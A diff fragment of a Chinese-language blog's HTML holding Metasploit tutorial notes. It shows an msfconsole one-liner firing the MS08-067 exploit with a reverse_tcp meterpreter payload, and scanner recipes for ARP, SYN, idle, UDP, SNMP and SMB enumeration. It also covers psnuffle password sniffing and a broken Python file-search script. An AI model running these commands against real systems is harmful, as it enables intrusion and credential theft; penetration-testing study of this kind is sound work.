+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load <span class="keyword">python</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"print ('asdasdas')"</span></span><br><span class="line">meterpreter &gt; python_execute <span class="string">"import os; cd = os.getcwd()"</span> -r <span class="keyword">cd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# <span class="keyword">cat</span> find2.<span class="keyword">py</span> </span><br><span class="line">import os</span><br><span class="line"><span class="keyword">for</span> root,dirs,<span class="keyword">files</span> in os.walk(<span class="keyword">c</span>://*):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">file</span> in <span class="keyword">file</span><span class="variable">s:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span>.endwith(<span class="string">".ini"</span> ) <span class="built_in">and</span> <span class="keyword">file</span>.startwith(<span class="string">"win"</span>):</span><br><span class="line">            <span class="keyword">print</span>(os.path.john(root,<span class="keyword">file</span>))</span><br><span class="line">python_import -<span class="keyword">f</span> <span class="keyword">find</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>
 
-
-
-root@kali:~# cat find2.py 
-import os
-for root,dirs,files in os.walk(c://*):
-    for file in files:
-        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
-            print(os.path.john(root,file))
-python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
+<h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
 <li>2015 年6月已经被取消</li>
 <li>由 msfconsole -x 取代</li>
 <li>编写脚本时便于引用</li>
 </ul>
-<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x "<span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi; <span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span>; <span class="keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>; <span class="keyword">set</span> LPORT <span class="number">5555</span>; <span class="keyword">set</span> target <span class="number">34</span>; exploit"</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
 <li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
-Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">msf</span> &gt; <span class="selector-tag">use</span> <span class="selector-tag">auxiliary</span>/<span class="selector-tag">scanner</span>/ <span class="selector-attr">[TAB]</span></span><br><span class="line"><span class="selector-tag">Display</span> <span class="keyword">all</span> <span class="selector-tag">531</span> <span class="selector-tag">possibilities</span>? (y or n)</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
 <li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
 </ul>
-<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -sV <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>auxiliary 目录下</li>
 <li>RHOSTS &lt;&gt; RHOST<ul>
 <li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
@@ -1060,24 +674,19 @@ Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="
 <li>use auxiliary/scanner/discovery/arp_sweep</li>
 <li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
 </ul>
-<pre><code>msf &gt; search arp
-msf &gt; use auxiliary/scanner/discovery/arp_sweep
-msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
-msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search arp</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; show options </span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/discovery/arp_sweep) &gt; run</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
 <li>use auxiliary/scanner/portscan/syn</li>
 <li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
 </ul>
-<pre><code>msf &gt; search portscan
-msf &gt; use auxiliary/scanner/portscan/syn
-msf auxiliary(scanner/portscan/syn) &gt; show options 
-msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
-msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
-msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
-msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
-msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; show options </span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> PORTS 80</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.0/24</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; <span class="builtin-name">set</span> THREADS 50</span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; run</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
 <li>查找 ipidseq 主机（查找僵尸机）<ul>
 <li>use auxiliary/scanner/ip/ipidseq</li>
 <li>set RHOSTS 192.168.1.0/24 ；run</li>
@@ -1085,67 +694,48 @@ msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"
 </ul>
 </li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
-msf auxiliary(scanner/ip/ipidseq) &gt; show options 
-msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
-msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq</span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/ip/ipidseq) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ip/<span class="comment">ipidseq) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -PN -sI <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
 <li>use auxiliary/scanner/discovery/udp_sweep</li>
 <li>use auxiliary/scanner/discovery/udp_probe</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
-msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
-msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
-msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
-msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
-msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
-msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_sweep) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.100-150</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set CHOST 10.10.10.131</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/discovery/<span class="comment">udp_probe) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
 <li>use auxiliary/sniffer/psnuffle</li>
 <li>支持从 pacap 抓包文件中提取密码</li>
 <li>功能类似于 dsniff</li>
 <li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
 </ul>
-<pre><code>msf &gt; search sniffer
-msf &gt; use auxiliary/sniffer/psnuffle
-msf auxiliary(sniffer/psnuffle) &gt; show options 
-msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
-msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
-msf auxiliary(sniffer/psnuffle) &gt; show options
-msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
-msf auxiliary(sniffer/psnuffle) &gt; jobs
-msf auxiliary(sniffer/psnuffle) &gt; kill 0
-msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search sniffer</span><br><span class="line">msf &gt; use auxiliary/sniffer/psnuffle</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show options </span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="builtin-name">set</span><span class="built_in"> INTERFACE </span>eth0</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ftp <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show <span class="keyword">options</span></span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; <span class="keyword">set</span> PCAPFILE /root/<span class="comment">ftp.pcapng</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; jobs</span><br><span class="line">msf auxiliary(sniffer/<span class="comment">psnuffle) &gt; kill 0</span></span><br><span class="line">msf <span class="comment">auxiliary(sniffer</span>/psnuffle) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
 <li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
 <li>use auxiliary/scanner/snmp/snmp_login</li>
 <li>use auxiliary/scanner/snmp/snmp_enum</li>
 <li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
 <li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
-msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
-msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
-msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
-msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run
-</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
-msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_enum) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142 （windows）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin （SNMP 服务器团体名）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumshares</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
 <li>SMB 版本扫描<ul>
 <li>use auxiliary/scanner/smb/smb_version</li>
 </ul>
@@ -1172,57 +762,46 @@ msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB�
 </li>
 <li>SMB 版本扫描</li>
 </ul>
-<pre><code>msf &gt; search smb
-msf &gt; use auxiliary/scanner/smb/smb_version
-msf auxiliary(scanner/smb/smb_version) &gt; show options 
-msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
-msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
-msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search smb</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="keyword">set</span> SMBUSER <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
-msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 继续上述</span></span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBUser Administrator</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBPass 123456</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>SMB 共享账号（账号、密码）</li>
 </ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
-msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
